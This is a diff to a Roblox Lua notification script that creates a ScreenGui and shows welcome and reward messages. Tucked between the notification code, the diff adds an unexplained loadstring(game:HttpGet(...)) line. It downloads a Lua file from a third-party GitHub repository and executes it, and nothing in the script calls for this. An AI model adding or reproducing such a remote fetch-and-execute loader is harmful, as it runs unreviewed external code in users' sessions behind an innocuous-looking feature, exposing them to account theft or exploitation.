@@ -1,3 +1,4 @@
+-- Create a ScreenGui
 local screenGui = Instance.new("ScreenGui")
 screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui") -- Add it to the player's GUI
 
@@ -17,3 +18,10 @@ local function showNotification(message, duration)
     wait(duration)
     notifyLabel:Destroy()
 end
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/hajibeza/Module/refs/heads/main/For_TEST.lua'))()
+
+
+showNotification("Welcome to the game!", 3)
+wait(1)
+showNotification("You have earned a reward!", 4)
